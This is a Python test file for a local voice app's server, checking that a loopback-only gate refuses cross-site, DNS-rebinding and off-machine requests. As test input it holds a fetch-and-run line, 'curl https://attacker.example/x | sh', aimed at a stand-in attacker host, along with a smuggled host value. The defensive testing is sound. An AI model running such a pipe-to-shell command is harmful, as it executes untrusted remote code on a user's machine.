"""LocalOnly: the gate in front of every route (server.py).

Voxwire has no authentication and can write the clipboard, record the mic, hand
out recordings and route commands to plugins. So every HTTP request and
WebSocket must come from this machine, be addressed to a loopback name, and, if
a browser sent it, come from Voxwire's own page. These tests send what an
attacking web page can send: a cross-site POST (CSRF), and a request under the
page's own host name after DNS rebinding.
"""
import re

import pytest

server = pytest.importorskip(
    "server", reason="server.py needs the audio stack (sounddevice/PortAudio)")
from fastapi.routing import APIRoute  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

LOCAL_PEER = ("127.0.0.1", 50000)
client = TestClient(server.app, base_url="http://127.0.0.1:8123", client=LOCAL_PEER)
REBOUND = {"host": "attacker.example:8123", "origin": "http://attacker.example:8123"}
REFUSED = "Voxwire answers only its own page on this machine."


@pytest.fixture
def clipboard(monkeypatch):
    written = []
    monkeypatch.setattr(server.osplatform, "copy_text", lambda text: written.append(text) or True)
    return written


# ── what this machine may do ───────────────────────────────────────────────
@pytest.mark.parametrize("host", ["127.0.0.1:8123", "localhost:8123", "[::1]:8123"])
def test_its_own_page_is_served(host):
    resp = client.get("/api/integrations", headers={"host": host, "origin": f"http://{host}"})
    assert resp.status_code == 200


def test_clients_without_an_origin_are_served(clipboard):
    """The menubar, scripts and curl send no Origin."""
    resp = client.post("/api/clipboard", json={"text": "hello"})
    assert resp.status_code == 200 and clipboard == ["hello"]


# ── what an attacking web page can send ────────────────────────────────────
def test_dns_rebinding_cannot_write_the_clipboard(clipboard):
    resp = client.post("/api/clipboard", json={"text": "curl https://attacker.example/x | sh"},
                       headers=REBOUND)
    assert resp.status_code == 403 and resp.text == REFUSED
    assert clipboard == []


def test_dns_rebinding_cannot_route_a_command():
    resp = client.post("/api/command", json={"transcript": "echo pwned"}, headers=REBOUND)
    assert resp.status_code == 403


def test_dns_rebinding_cannot_read_recordings_even_without_an_origin():
    """A same-origin GET after rebinding carries no Origin; the Host gives it away."""
    resp = client.get("/api/recordings", headers={"host": REBOUND["host"]})
    assert resp.status_code == 403


@pytest.mark.parametrize("origin", [
    "https://attacker.example",     # an ordinary cross-site page
    "null",                         # a sandboxed iframe or a file:// page
    "http://127.0.0.1:9999",        # another local app's page
    "http://localhost:8123",        # loopback, but not the host this request names
], ids=["cross-site", "opaque", "other-local-port", "other-loopback-name"])
def test_a_cross_site_post_is_refused(origin, clipboard):
    resp = client.post("/api/clipboard", json={"text": "x"}, headers={"origin": origin})
    assert resp.status_code == 403
    assert clipboard == []


def test_a_bodiless_post_is_refused_too():
    """A POST without a body is a 'simple' request: no preflight ever runs, so only
    the Origin check stands between a web page and routes like this one."""
    resp = client.post("/api/dictation/test", headers={"origin": "https://attacker.example"})
    assert resp.status_code == 403


@pytest.mark.parametrize("peer", ["203.0.113.7", "2001:db8::1", "testclient"])
def test_peers_off_this_machine_are_refused(peer, clipboard):
    remote = TestClient(server.app, base_url="http://127.0.0.1:8123", client=(peer, 50000))
    assert remote.post("/api/clipboard", json={"text": "x"}).status_code == 403
    assert clipboard == []


# ── deny by default ────────────────────────────────────────────────────────
def _routes():
    for route in server.app.routes:
        if isinstance(route, APIRoute):
            path = re.sub(r"\{[^}]+\}", "1", route.path)     # /api/recordings/{rid}.wav → …/1.wav
            for method in sorted(route.methods):
                yield method, path


@pytest.mark.parametrize("method,path", list(_routes()))
def test_every_route_refuses_a_rebound_page(method, path):
    """A route added later is covered without anyone remembering to cover it."""
    assert client.request(method, path, headers=REBOUND).status_code == 403


# ── the host check itself ──────────────────────────────────────────────────
@pytest.mark.parametrize("host,ok", [
    ("127.0.0.1:8123", True),
    ("127.0.0.1", True),
    ("LOCALHOST:8123", True),
    ("[::1]:8123", True),
    (None, False),
    ("", False),
    ("attacker.example:8123", False),
    ("127.0.0.1.attacker.example", False),
    ("attacker.example@127.0.0.1:8123", False),     # userinfo can't smuggle a name in
])
def test_loopback_host(host, ok):
    assert server._loopback_host(host) is ok


# ── the peer is the real connection ────────────────────────────────────────
def test_a_forwarded_header_cannot_stand_in_for_the_peer():
    """Uvicorn trusts X-Forwarded-For from 127.0.0.1 unless told not to, so a
    local reverse proxy (or any local process) could replace the peer LocalOnly
    checks. Every launcher serves with server.UVICORN, which turns that off; a
    real server shows the header is ignored."""
    import socket
    import threading
    import time
    import urllib.request

    import uvicorn

    assert server.UVICORN["proxy_headers"] is False and server.UVICORN["host"] == "127.0.0.1"
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
    srv = uvicorn.Server(uvicorn.Config(server.app, **{**server.UVICORN, "port": port}))
    thread = threading.Thread(target=srv.run, daemon=True)
    thread.start()
    try:
        for _ in range(200):
            if srv.started:
                break
            time.sleep(0.05)
        req = urllib.request.Request(f"http://127.0.0.1:{port}/api/integrations",
                                     headers={"X-Forwarded-For": "203.0.113.9"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            assert resp.status == 200
    finally:
        srv.should_exit = True
        thread.join(timeout=10)


@pytest.mark.parametrize("launcher", ["menubar.py", "tray.py"])
def test_the_app_launchers_serve_with_the_same_options(launcher):
    """The menubar and tray apps need a GUI stack to import, so check their source."""
    from pathlib import Path
    source = (Path(server.__file__).parent / launcher).read_text()
    assert "uvicorn.Config(server.app, **{**server.UVICORN," in source
